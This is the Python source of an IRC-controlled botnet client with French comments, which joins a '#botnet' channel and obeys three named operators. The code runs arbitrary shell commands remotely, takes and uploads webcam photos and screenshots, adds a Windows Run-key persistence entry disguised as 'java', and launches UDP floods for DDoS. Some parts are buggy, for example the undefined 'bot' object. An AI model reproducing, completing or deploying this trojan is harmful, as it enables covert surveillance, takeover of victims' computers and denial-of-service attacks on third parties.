# -*- coding: utf-8 -*-
import irc.bot
import irc.strings
from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
import os
from uttility import *


#-------------------------------- function ------------------------------------------
def multiLineMsg(me, target, msg):
    lines = msg.split("\n")
    final = []
    for line in lines:
        for l in line.split("\r"):
            final.append(l)         #comme ça ça decoupe dès qu'il y a du \r et \n
    for msg in final:
        bot.notice(target, msg)

def cmd_output(me, target, cmd):
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = process.stdout.read().decode('utf-8', errors="ignore")+process.stderr.read().decode('cp1252')
    multiLineMsg(me, target, output)

def persistance(me, target):
    try:
        app = os.path.realpath(__file__).replace('.py', '.exe')
        subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v java /t REG_SZ /f /d '+"'"+app+"'", shell=True)
        bot.notice(nick, "l'ajout de la persistance est un succes")
    except:
        bot.notice(ircChannel, "erreur, l'ajout presistance à échoué")

#------------------------------------ bot -------------------------------------------

class KysBot(irc.bot.SingleServerIRCBot):
    def __init__(self, channel, nickname, server, port=6667):
        irc.bot.SingleServerIRCBot.__init__(self,[(server, port)], nickname, nickname)
        self.channel = channel

    def on_nicknameinuse(self, c, e):
        bot.nick(bot.get_nickname() + "0x")

    def on_welcome(self, me, e):
        print("connected")
        bot.join(self.channel)
        multiLineMsg(me, "Kysan", "hi!\nwhere is senpai?")
        print("connected")
    
    
    #en cas de message privé
    def on_privmsg(self, me, e):
        self.do_command(e, e.arguments[0])          #si reçois un message sur un channel publique prend le message et l'interprete 


    #en cas de message public
    def on_pubmsg(self, me, e):
        self.do_command(e, e.arguments[0])          #si reçois un message sur un channel publique prend le message et l'interprete 

    def on_dccmsg(self, me, e):
        pass

    def on_dccchat(self, me, e):
        if len(bot.arguments) != 2:
            return
        args = bot.arguments[1].split()
        if len(args) == 4:
            try:
                address = ip_numstr_to_quad(args[2])
                port = int(args[3])
            except ValueError:
                return
            self.dcc_connect(address, port)

    def do_command(self, e, message):           #bot function
        nick = e.source.nick
        #print(nick + ": " + cmd)
        cmd = message.split(" ")
        args = cmd[1:]
        command = cmd[0]
        

        #master qu'il écoute
        if nick == "Kysan" or nick == "Loguana" or nick == "Corps":
            me = self.connection
            bot.notice(nick, "analysing...")


            #pour le fair ece 
            if command == "disconnect":
                self.disconnect()
            


            #pour le faire quitter
            elif command == "die":
                self.die()


            #executer un commande
            elif command == "cmd":
                threading.Thread(target=cmd_output, args=(me, nick, " ".join(args))).start()



            #pour prendre une photo
            elif command == "cam":
                try:
                    file = takePicture()
                    print(file)
                    link = post_img(file)
                    bot.notice(nick, "uploaded on: "+str(link))
                    os.system("del "+file)
                except:
                    bot.notice(nick, "error")
            

            #pour prendre un screenshot
            elif command == "screenshot":
                try:
                    file = screenshot()
                    print(file)
                    link = post_img(file) 
                    bot.notice(nick, "uploaded on: "+str(link))
                    os.system("del "+file)
                except:
                    bot.notice(nick, "error")


            #pour avoir des infos sur le bot
            elif command == "info":
                bot.notice(nick, info())


            #pour que le bot change de nom
            elif command == "changenick":
                bot.nick(args[0])


            #pour lister les commandes (a mettre a jours la)
            elif command == "help":
                bot.notice(nick, "availiable commands:")
                bot.notice(nick, "disconnect, cam, screenshot, info, cmd, getcwd")

            #elif args[0] == exec: a faire


            #pour naviger dans les fichiers
            elif command == "getcwd":
                bot.notice(nick, os.getcwd())


            #pour naviger dans les fichiers
            elif command == "cd":
                print(" ". join(args))
                os.system("cd "+ " ". join(args))
            

            #fonction pour ddos
            elif command == "flood":
                threading.Thread(target=udp_flooding, args=(args[0], args[1], c, nick)).start()
                bot.notice(nick, "started")
            

            #pour installer le bot
            elif command == "install":
                persistance(me, nick)

            #en cas de commande inconnue
            else:
                bot.notice(nick, "Unknow command: " + message)
                bot.notice(nick, "type help for commands list")

#--------------------------------- start ----------------------------

def main():
    bot = KysBot("#botnet", "kysbot"+get_ip(), "irc.root-me.org", 6697)
    bot.start()
    os.system("pause>nul")

main()
#made by Kysan721
